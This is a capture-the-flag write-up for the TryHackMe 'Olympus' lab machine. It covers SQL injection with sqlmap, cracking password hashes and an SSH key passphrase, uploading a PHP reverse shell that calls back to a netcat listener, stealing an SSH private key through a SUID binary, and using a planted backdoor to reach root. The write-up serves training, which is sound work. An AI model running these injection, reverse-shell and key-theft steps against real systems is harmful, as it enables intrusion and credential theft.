---
title: TryHackMe - Olympus
date: 2026-04-28
tags:
  - TryHackMe
  - Web Exploitation
  - Privilege Escalation
summary: Exploited a vulnerable CMS via SQL injection to dump credentials and flags, abused a file upload feature for RCE, leveraged a custom SUID binary to extract an SSH key, and achieved root through a hidden backdoor binary.
---

# Olympus - TryHackMe Writeup

One of the best Boot2Root challenges I’ve come across it covers multiple techniques and feels very realistic.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.48.170.227
```

![Alt Text](nmap-scan.png) 

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache 2.4.41 |

The HTTP service redirected to `http://olympus.thm`. This indicates a virtual host is configured.

### Add Virtual Host to /etc/hosts

```bash
sudo nano /etc/hosts
# Add:
10.48.170.227   olympus.thm
```

---

## Web Reconnaissance

### Browsing the Main Page

Navigating to `http://olympus.thm` showed a page under development with an important clue:

> *"The old version of the website is still accessible on this domain."*

![Alt Text](olympus.png) 

Viewing the page source revealed additional hints:
- Keywords referencing **AperiSolve** and **Zeecka** (developer handle)
- A contact email: `root@the-it-department`

### Directory Brute Force

```bash
gobuster dir -u http://olympus.thm \
  -w /usr/share/wordlists/dirb/common.txt 
```

![Alt Text](gobusteronolympus.png) 

**Interesting findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/index.php` | 200 | Main page |
| `/phpmyadmin` | 403 | Forbidden — exists but blocked |
| `/~webmaster/` | 301 | Exists  |

### Discovering the Old Site

Manually browsing to `/~webmaster/` revealed **Victor CMS** — an old, vulnerable CMS installation.

![Alt Text](webmaster.png) 

---

## SQL Injection — Flag 1

### Identifying the Vulnerable Endpoint

The search form at `/~webmaster/search.php` was tested with a basic SQL injection payload:

```
search=' OR 1=1 &submit=
```

The response returned a raw MySQL error, confirming the injection point.


### Automating with SQLMap

Save the POST request to a file (`sql.txt`) using Burp, then run:

```bash
sqlmap -r sql.txt --batch --dbs
```

![Alt Text](sqlmaponolympus.png) 

**Databases found:**

```
[*] information_schema
[*] mysql
[*] olympus      <-- TARGET
[*] performance_schema
[*] phpmyadmin
[*] sys
```

### Dumping the Flag Table

```bash
sqlmap -r sql.txt --batch -D olympus --tables
```

A `flag` table was discovered. Dumped its contents:

```bash
sqlmap -r sql.txt --batch -D olympus -T flag --dump
```



**Flag 1:**
```
REDACTED
```

### Dumping User Credentials

```bash
sqlmap -r sql.txt --batch -D olympus -T users --dump
```

![Alt Text](sqlmaponolympususers.png) 

Three users were found:

| Username | Role | Hash |
|----------|------|------|
| prometheus | User | `$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C` |
| root | Admin | `$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK` |
| zeus | User | `$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC` |

### Dumping the Chats Table

```bash
sqlmap -r sql.txt --batch -D olympus -T chats --dump
```



Key finding: a file reference was stored in chat messages:
```
47c3210d51761686f3af40a875eeaaea.txt  ← prometheus_password.txt
```

This also revealed a second subdomain in user emails: `chat.olympus.thm`

---

## Discovering the Chat Subdomain

Add the new subdomain to `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Add:
10.48.170.227   chat.olympus.thm
```

Browsing to `http://chat.olympus.thm` revealed a login portal.

![Alt Text](chatolmpuysloginpage.png) 

### Cracking the Password Hash

Save the bcrypt hashes to `hashes.txt` and crack with John:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Alt Text](passwdcrack.png) 

**Cracked credential:**
```
prometheus : summertime
```

---

## Gaining Initial Shell — Flag 2

### Logging Into the Chat App

Login at `http://chat.olympus.thm/login.php` using:
- **Username:** `prometheus`
- **Password:** `summertime`

![Alt Text](chatapp.png) 


Before locating the uploaded file, a quick directory scan was performed on the chat subdomain:

```bash
gobuster dir -u http://chat.olympus.thm -w /usr/share/wordlists/dirb/common.txt
````

This revealed the `/uploads/` directory, indicating where user-uploaded files are stored. 

However, since filenames are randomized, the exact file name was later confirmed via the database dump.


![Alt Text](gobusteronchat.png) 


### Uploading a PHP Reverse Shell

The chat app allowed file uploads. A PHP reverse shell was prepared:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nano php-reverse-shell.php
# Set: $ip = '192.xxx.x.x';  $port = 4444;
```


### Finding the Uploaded File's Random Name

The server renames uploaded files. The new name was found by querying the database again with `--fresh-queries`:

```bash
sqlmap -r sql.txt --batch -D olympus -T chats --dump --fresh-queries
```

![Alt Text](sqlfreshdb.png) 

The filename matched a pattern like: `2e449bc3f8b58e9eb3f16c030d45b081.php`

### Starting a Listener and Triggering the Shell

```bash
nc -lvnp 4444
```

Then navigate to:
```
http://chat.olympus.thm/uploads/2e449bc3f8b58e9eb3f16c030d45b081.php
```

![Alt Text](reverseshell.png) 

Shell received as `www-data`.

### User Flag

```bash
cat /home/zeus/user.flag
```


**Flag 2:**
```
REDACTED
```

---

## Privilege Escalation to Zeus

### Checking SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```


An unusual binary stood out:
```
/usr/bin/cputils
```

### Abusing cputils to Steal Zeus's SSH Key

`cputils` is a custom SUID binary that copies files while running as another user. It was used to extract Zeus's SSH private key:

```bash
/usr/bin/cputils
# When prompted:
# Source: /home/zeus/.ssh/id_rsa
# Destination: /tmp/id_rsa

cat /tmp/id_rsa
```

### Cracking the SSH Key Passphrase



```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```



**Passphrase:** `snowflake`

### SSH as Zeus

```bash
chmod 600 id_rsa
ssh -i id_rsa zeus@olympus.thm
# Enter passphrase: snowflake
```

![Alt Text](zeusaccess.png)

---

## Root — Flags 3 & 4

### Discovering the Hidden Web Directory

```bash
cd /var/www/html
ls -al
```


A suspicious directory was found:
```
0aB44fdS3eDnLkpsz3deGv8TttR4sc/
```

Inside it was a PHP backdoor:

```bash
cat /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

![Alt Text](htmlfolder.png)

The PHP file referenced a SUID backdoor binary:
```php
$suid_bd = "/lib/defended/libc.so.99";
```

### Executing the Root Backdoor

```bash
/lib/defended/libc.so.99
```

![Alt Text](rootaccess.png)

```
# id
uid=0(root) gid=0(root)
```

### Root Flag

```bash
cat /root/root.flag
```

**Flag 3 (Root):**
```
REDACTED
```

### Bonus SSL Flag

For This Last Flag i used the hints in THM it said that flag is in /etc or else i dont know how could have found it lol

```bash
cat /etc/ssl/private/.b0nus.fl4g
```


**Flag 4 (Bonus):**
```
REDACTED
```

---

## Bonus Flag (Hidden)

The room hints that Prometheus left a hidden flag. To find it:

```bash
find / -type f -name ".*" 2>/dev/null -exec grep -i "flag{" {} \;
```




---

## Flags Summary

| # | Flag | Location |
|---|------|----------|
| 1 | `REDACTED` | Database — `olympus.flag` table |
| 2 | `REDACTED` | `/home/zeus/user.flag` |
| 3 | `REDACTED` | `/root/root.flag` |
| 4 | `REDACTED` | `/etc/ssl/private/.b0nus.fl4g` |

---

## Attack Chain Summary

```
Nmap scan → Virtual host discovery
    ↓
Gobuster → /~webmaster/ (Victor CMS)
    ↓
SQL Injection (search.php)
    ↓
DB dump → Flag 1 + credentials + chat subdomain hint
    ↓
Hash cracking → prometheus:summertime
    ↓
Login to chat.olympus.thm
    ↓
File upload → PHP reverse shell
    ↓
SQLMap --fresh-queries → randomised filename revealed
    ↓
Shell as www-data → Flag 2 (user.flag)
    ↓
SUID cputils → steal Zeus SSH key
    ↓
SSH key passphrase cracked → SSH as zeus
    ↓
Hidden web dir → SUID backdoor binary
    ↓
/lib/defended/libc.so.99 → ROOT
    ↓
Flag 3 (root.flag) + Flag 4 (.b0nus.fl4g)
```

---

PWN by **W4RR1OR**